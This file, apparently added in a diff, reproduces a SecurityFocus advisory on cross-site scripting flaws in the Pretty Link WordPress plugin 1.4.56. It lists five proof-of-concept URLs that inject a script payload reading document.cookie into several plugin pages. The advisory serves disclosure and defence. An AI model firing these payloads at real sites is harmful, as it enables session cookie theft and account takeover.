@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/50096/info
+
+The Pretty Link plugin for WordPress is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Pretty Link Plugin 1.4.56 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/wp-content/plugins/pretty-link/classes/views/prli-clicks/head.php?min_date=%3Cscript%3Ealert%28d ocument.cookie%29;%3C/script%3E
+http://www.example.com/wp-content/plugins/pretty-link/classes/views/prli-dashboard-widget/widget.php?message=%3Cscript% 3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/wp-content/plugins/pretty-link/classes/views/prli-links/form.php?prli_blogurl=%3Cscript%3Ealert% 28document.cookie%29;%3C/script%3E
+http://www.example.com/wp-content/plugins/pretty-link/classes/views/shared/errors.php?errors[]=%3Cscript%3Ealert%28docu ment.cookie%29;%3C/script%3E
+http://www.example.com/wp-content/plugins/pretty-link/classes/views/shared/table-nav.php?page_count=2&page_first_re cord=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E 
